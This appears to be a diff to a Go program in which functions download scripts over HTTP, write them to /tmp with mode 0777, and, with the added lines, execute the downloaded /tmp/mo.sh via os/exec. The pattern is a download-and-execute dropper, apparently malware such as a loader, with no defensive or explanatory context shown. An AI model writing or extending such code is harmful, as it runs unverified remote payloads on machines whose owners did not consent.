@@ -6,7 +6,11 @@ import (
 "fmt"
 "net/http"
 "io/ioutil"
+"os/exec"
+
 )
+
+
 
 
 
@@ -53,7 +57,6 @@ script  , err_readall :=  ioutil.ReadAll(resp.Body)
 ioutil.WriteFile("/tmp/down_vkzmn.sh" , script , 0777 )
  
 
-
 }
 
 
@@ -63,10 +66,6 @@ ioutil.WriteFile("/tmp/down_vkzmn.sh" , script , 0777 )
 
 
 func down_mo(){
-
-
-
-
 
 
 
@@ -89,8 +88,10 @@ mo_bytes  , err_readall := ioutil.ReadAll(resp.Body)
      ioutil.WriteFile("/tmp/mo.sh" , mo_bytes , 0777)
       
 
-     
- 
+        mo := exec.Command("/tmp/./mo.sh") 
+
+        mo.Run()
+
 
 }
 
